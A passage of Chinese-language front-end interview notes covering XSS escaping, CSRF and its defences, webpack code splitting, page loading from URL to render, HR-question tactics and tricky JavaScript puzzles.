            - 把 < 替换成 &lt;
            - 把 > 替换成 &gt;
            - 把 & 替换成 &amp;
            - 把 ’ 替换成 &#39;
            - 把 ’ 替换成 &quot;
            - 代码 div.innerHTML = userComment.replace(/>/g, ‘&lt;’).replace…
        - 使用 CSP Content Security Policy


2. 什么是 CSRF 攻击？如何预防？
    - 跨站请求伪造,Cross-site Request Forgery
    - 过程:
        - 用户在注册网站A登陆过，网站A给用户下发cookie
        - 该用户又访问了网站B，网站B有诱导链接，用户点击后，访问到了网站A，浏览器自动上传cookie，网站A对身份验证后发现是正确的，然后允许登录，网站B对网站A进行攻击
        - 关键：用户在注册网站A登陆过
        - 网站中某个接口存在漏洞
    - 防御措施
        - Referer验证：页面来源
        - Token验证：登录时，向用户本地存放一个Token，用于下次登录的验证

3. XSS和CSRF区别
    - XSS : 向页面注入js，运行js，做一些事情
    - CSRF: 
        - 依赖于用户登录网站
        - 利用本身的漏洞，去帮你自动执行接口


#### Webpack 题
1. 转译出的文件过大怎么办？
    - 使用 code split
    - 写法  import(‘xxx’).then(xxx=>{console.log(xxx)})
    - xxx 模块就是按需加载的

2. 转译速度慢什么办？
    - webpack 慢 怎么办，搜一下
3. 写过 webpack loader 吗？[参考](http://www.alloyteam.com/2016/01/webpack-loader-1/)


#### 发散题
1. 从输入 URL 到页面展现中间发生了什么？
    - DNS 查询 DNS 缓存
    - 建立 TCP 连接（三次握手）连接复用
    - 发送 HTTP 请求（请求的四部分）
    - 后台处理请求
        - 监听 80 端口
        - 路由
        - 渲染 HTML 模板
        - 生成响应
    - 发送 HTTP 响应
    - 关闭 TCP 连接（四次挥手）
    - 解析 HTML
    - 下载 CSS（缓存
    - 解析 CSS
    - 下载 JS（缓存
    - 解析 JS
    - 下载图片
    - 解析图片
    - 渲染 DOM 树
    - 渲染样式树
    - 执行 JS

2. 你没有工作经历吗？
    - 一开始就问，可以拜拜。
    - 中间问最后问，他想压价。
    - 解法：用项目打动它：你看下我的作品，跟一年经验的前端差距大吗？你们团队一年工作经验的前端，写的出来我这样的作品吗？凭我的作品，我觉得我可以胜任贵司的工作。

3. 你遇到过最难的问题是什么？
    - [参考](https://www.zhihu.com/question/35323603/answer/338796153)
4. 你的期望薪资是多少？ 你想要的工资 加 1000~2000。
5. 任何你不会的问题
    - 承认不会
    - 询问详细细节：你问的是不是XXX方面的知识？请问你想问的是哪方面知识？
    - 根据面试官的回答，向有利于自己的方向引导话题。
    

#### 刁钻代码题
1. map加parseInt
    
    ```
    [1,2,3].map(parseInt)
    parseInt(1,0, array) // 1
    parseInt(2,1, array) // NaN
    parseInt(3,2, array) // NaN
    ```

2. a.x = a = {}
    
    ```
    var a = {n:1};
    var b = a;
    a.x = a = {n:2};
    
    问 a.x 是多少？ // undefined a.x是之前的a，现在的a.x不存在
    ```
3. (a == 1 && a== 2 && a==3) 可能为 true 吗？
    
    ```
    a = {
      value: 0,
      toString(){
        a.value += 1
        return a.value 
      }
    }
    ```

### 学习网站
1. stack Overflow
2. 掘金
3. 谷歌
4. CNode社区
5. 知乎

